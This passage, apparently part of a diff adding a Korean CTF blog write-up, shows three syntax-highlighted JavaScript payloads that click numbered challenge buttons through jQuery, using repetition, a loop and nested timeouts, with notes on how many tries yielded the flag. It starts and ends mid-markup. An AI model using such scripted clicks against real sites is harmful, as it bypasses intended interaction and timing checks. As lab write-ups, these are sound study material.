syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(2, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(3, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(4, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(5, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(6, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(7, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(8, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(9, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(10, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+</pre>
+<ul>
+<li>
+<p>한 몇십번 시도하니 플래그가 나왔다.</p>
+</li>
+<li>
+<h4>payload 2</h4>
+</li>
+</ul>
+<pre class="editor-colors lang-javascript"><span class="syntax--source syntax--js"><span class="syntax--keyword syntax--control syntax--js"><span>for</span></span><span> </span><span class="syntax--meta syntax--brace syntax--round syntax--js"><span>(</span></span><span class="syntax--storage syntax--type syntax--var syntax--js"><span>var</span></span><span> i </span><span class="syntax--keyword syntax--operator syntax--assignment syntax--js"><span>=</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>0</span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span><span> i </span><span class="syntax--keyword syntax--operator syntax--comparison syntax--js"><span>&lt;</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>11</span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span><span> i</span><span class="syntax--keyword syntax--operator syntax--increment syntax--js"><span>++</span></span><span class="syntax--meta syntax--brace syntax--round syntax--js"><span>)</span></span><span> </span><span class="syntax--meta syntax--brace syntax--curly syntax--js"><span>{</span></span></span>
+<span class="syntax--source syntax--js"><span>	</span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--keyword syntax--operator syntax--js"><span>+</span></span><span>i</span><span class="syntax--keyword syntax--operator syntax--js"><span>+</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--brace syntax--curly syntax--js"><span>}</span></span></span>
+</pre>
+<ul>
+<li>
+<p>세번 시도하니 플래그가 나왔다.</p>
+</li>
+<li>
+<h4>payload 3</h4>
+</li>
+</ul>
+<pre class="editor-colors lang-javascript"><span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>    </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(1, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>    </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>        </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(2, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>        </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>            </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(3, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>            </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(4, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                    </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(5, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                    </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                        </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin 